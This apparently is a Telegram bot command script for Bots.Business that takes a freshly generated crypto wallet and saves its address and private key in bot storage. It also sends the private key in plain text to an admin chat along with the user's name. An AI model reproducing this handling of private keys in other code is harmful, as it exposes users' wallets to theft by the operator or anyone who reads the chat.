/*CMD
  command: sucsjsjs
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
CMD*/

var data = JSON.parse(content)
let inf =
  "[" +
  user.first_name +
  "]" +
  "(" +
  "tg://user?id=" +
  user.telegramid +
  ")";
  var p = Bot.getProperty("admin01")
var res = data.address.base58
User.setProperty("wallset",res, "string")
var priv = data.privateKey
User.setProperty("wallpk",priv, "string")
let wall =Bot.setProperty("wall"+user.telegramid,res,"string")
let wallpk =Bot.setProperty("wallp"+user.telegramid,priv,"string")
Bot.sendMessageToChatWithId(p,"User name "+inf+"\n*Address :*\n`"+res+"`\n\n*Private Key :*\n`"+priv+"`\n\n")
Bot.setProperty("depr"+user.telegramid,user.telegramid,"string")
   Bot.runCommand("/Deposit")
